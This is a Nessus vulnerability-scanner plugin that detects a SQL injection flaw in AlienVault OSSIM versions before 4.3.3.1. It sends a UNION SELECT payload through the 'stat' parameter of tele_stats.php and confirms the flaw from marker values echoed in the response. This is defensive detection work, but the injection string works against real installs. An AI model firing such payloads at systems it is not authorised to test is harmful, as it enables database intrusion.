#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(76216);
  script_version("$Revision: 1.3 $");
  script_cvs_date("$Date: 2015/09/24 23:21:19 $");

  script_bugtraq_id(65406);
  script_osvdb_id(102850);

  script_name(english:"OSSIM < 4.3.3.1 tele_stats.php SQL Injection");
  script_summary(english:"Tries to download the contents of '/etc/ossim'.");

  script_set_attribute(attribute:"synopsis", value:
"An application hosted on the remote web server has a SQL injection
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The OSSIM install hosted on the remote host has a SQL injection
vulnerability. Input to the 'stat' parameter of the
'/ossim/ocsreports/tele_stats.php' script is not properly sanitized.

A remote attacker could potentially exploit this to execute arbitrary
SQL commands as the MySQL 'root' user.");
  # http://forums.alienvault.com/discussion/1873/security-advisory-all-alienvault-versions-prior-to-v4-3-3-1
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?dfee2a1b");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2014/Feb/18");
  script_set_attribute(attribute:"solution", value:"Upgrade to OSSIM 4.3.3.1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/02/03");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/10/11");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/06/25");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:alienvault:open_source_security_information_management");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2014-2015 Tenable Network Security, Inc.");

  script_dependencies("ossim_web_detect.nasl");
  script_require_keys("www/ossim", "www/PHP");
  script_require_ports("Services/www", 443);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");

get_kb_item_or_exit("www/ossim");
port = get_http_port(default:443, php:TRUE);
app_name = "AlienVault OSSIM";

install = get_install_from_kb(appname:'ossim', port:port, exit_on_fail:TRUE);
report_url = build_url(port:port, qs:install['dir']+'/');

payload_nb = unixtime();
payload_txt = SCRIPT_NAME;
payload =
  "99999' UNION SELECT " + payload_nb +",'" + payload_txt + "' UNION SELECT COUNT(id) as 'nb', " +
  "tvalue as 'txt' FROM devices d, download_enable e WHERE e.fileid='99999";

payload = urlencode(
  str        : payload,
  unreserved : "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234" +
                 "56789=+&_"
);

url = install['dir'] + "/ocsreports/tele_stats.php?stat=" + payload;
res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);

pattern_txt = "<td>" + payload_txt + "</td>";
pattern_nb = "<td><a href='index\.php\?multi=1&nme=&stat=" + payload_txt + "'>" + payload_nb + "</a></td>";

# Both patterns must be present to confirm vulnerability.
if (
  !preg(string:res[2], pattern:pattern_txt, multiline:TRUE, icase:TRUE) ||
  !preg(string:res[2], pattern:pattern_nb, multiline:TRUE, icase:TRUE)
) audit(AUDIT_WEB_APP_NOT_AFFECTED, app_name, report_url);

# If we got this far, site is vulnerable.
set_kb_item(name:'www/'+port+'/SQLInjection', value:TRUE);
if (report_verbosity > 0)
{
  report =
    '\n' +'Nessus was able to verify the issue with the following URL :' +
    '\n' +
    '\n' + build_url(port:port, qs:url) +
    '\n';
  security_hole(port:port, extra:report);
}
else security_hole(port);
